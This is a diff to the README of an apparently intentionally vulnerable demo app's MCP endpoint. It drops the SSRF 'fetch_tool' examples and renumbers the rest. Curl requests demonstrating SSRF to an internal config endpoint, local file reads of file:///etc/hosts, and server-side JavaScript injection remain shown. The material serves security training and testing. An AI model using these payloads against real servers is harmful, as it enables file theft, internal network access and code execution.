@@ -1232,7 +1232,6 @@ Full configuration & usage examples can be found in our [demo project](https://g
   - **SQL Injection via count_tool** - The `count_tool` accepts a SQL query parameter and executes it directly against the database without sanitization, similar to the `/api/testimonials/count` endpoint.
   - **Sensitive Data Exposure via config_tool** - The `config_tool` returns application configuration including database credentials, API keys, and cloud storage URLs.
   - **Server-Side Template Injection via render_tool** - The `render_tool` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
-  - **Server-Side Request Forgery via fetch_tool** - The `fetch_tool` accepts an arbitrary URL and performs a server-side HTTP request without host, IP range, or protocol restrictions.
   - **Local File Inclusion via MCP resources/read** - The `resources/read` method accepts `file://` URIs and proxies `/api/file/raw`, allowing arbitrary file reads such as `file:///etc/hosts`.
   - **Server-Side JavaScript Injection via process_numbers_tool** - The `process_numbers_tool` proxies `/api/process_numbers` and executes arbitrary JavaScript from the `processing_expression` expression in server context.
   - **Authentication and Session Management** - The `/api/mcp` endpoint supports optional authentication and per-client session tracking:
@@ -1309,28 +1308,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
          }'
        ```
 
-    3. `fetch_tool` (public)  
-       Vulnerability: **Server-Side Request Forgery (SSRF)** via arbitrary server-side URL fetch.  
-       Example:
-
-       ```bash
-       curl "${BASE}/api/mcp" -X POST \
-         -H 'Content-Type: application/json' \
-         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
-         -d '{
-           "jsonrpc": "2.0",
-           "method": "tools/call",
-           "params": {
-             "name": "fetch_tool",
-             "arguments": {
-               "url": "http://127.0.0.1:3000/api/config"
-             }
-           },
-           "id": 4
-         }'
-       ```
-
-    4. `resources/list` + `resources/read` (public)  
+    3. `resources/list` + `resources/read` (public)  
        Vulnerability: **Local File Inclusion (LFI)** via `file://` URI read from `/api/file/raw`.  
        Example:
 
@@ -1341,7 +1319,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
          -d '{
            "jsonrpc": "2.0",
            "method": "resources/list",
-           "id": 5
+           "id": 4
          }'
 
        curl "${BASE}/api/mcp" -X POST \
@@ -1353,11 +1331,11 @@ Full configuration & usage examples can be found in our [demo project](https://g
            "params": {
              "uri": "file:///etc/hosts"
            },
-           "id": 6
+           "id": 5
          }'
        ```
 
-    5. `process_numbers_tool` (public)  
+    4. `process_numbers_tool` (public)  
        Vulnerability: **Server-Side JavaScript Injection (SSJI)** via dynamic code execution.  
        Example:
 
@@ -1375,11 +1353,11 @@ Full configuration & usage examples can be found in our [demo project](https://g
               "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
             }
           },
-          "id": 7
+          "id": 6
          }'
        ```
 
-    6. `config_tool` (admin only)  
+    5. `config_tool` (admin only)  
        Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
        Example (admin-authenticated MCP session):
 
@@ -1512,28 +1490,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
      }
      ```
 
-  4. **Server-Side Request Forgery via fetch_tool**:
-
-     ```bash
-     curl "${BASE}/api/mcp" -X POST \
-       -H 'Content-Type: application/json' \
-       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
-       -d '{
-         "jsonrpc": "2.0",
-         "method": "tools/call",
-         "params": {
-           "name": "fetch_tool",
-           "arguments": {
-             "url": "http://127.0.0.1:3000/api/config"
-           }
-         },
-         "id": 5
-       }'
-     ```
-
-     This payload forces the MCP server to request an internal endpoint from its own network context.
-
-  5. **Local File Inclusion via resources/read**:
+  4. **Local File Inclusion via resources/read**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1545,13 +1502,13 @@ Full configuration & usage examples can be found in our [demo project](https://g
          "params": {
            "uri": "file:///etc/hosts"
          },
-         "id": 6
+         "id": 5
        }'
      ```
 
      This payload reads local server files through the `/api/file/raw` proxy using a `file://` URI.
 
-  6. **Server-Side JavaScript Injection via process_numbers_tool**:
+  5. **Server-Side JavaScript Injection via process_numbers_tool**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1567,13 +1524,13 @@ Full configuration & usage examples can be found in our [demo project](https://g
              "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
            }
          },
-         "id": 7
+         "id": 6
        }'
      ```
 
      This payload executes JavaScript directly on the server.
 
-  7. **Server-Side Template Injection via render_tool**:
+  6. **Server-Side Template Injection via render_tool**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
